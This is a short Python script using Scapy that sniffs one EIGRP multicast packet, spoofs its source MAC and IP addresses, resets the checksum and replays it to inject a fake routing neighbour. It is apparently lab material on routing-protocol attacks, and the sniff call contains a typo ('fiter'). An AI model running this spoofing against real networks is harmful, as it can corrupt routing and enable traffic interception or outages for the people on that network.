# Add fake EIGRP neighbour, one packet

# Import scapy
from scapy.all import *

# Import EIGRP
load_contrib('eigrp')

# Sniff for an EIGRP packet
pkt = sniff(fiter="ip dst 224.0.0.10", count = 1)

# Change the source MAC address
pkt[0].src="00:00:00:11:11:11"

# Change the source IP address 
pkt[0][IP].src="192.168.122.123"

# Change Checksum
pkt[0][IP].chksum=None

# Send packet into network
sendp(pkt[0], loop=0, verbose = 1)
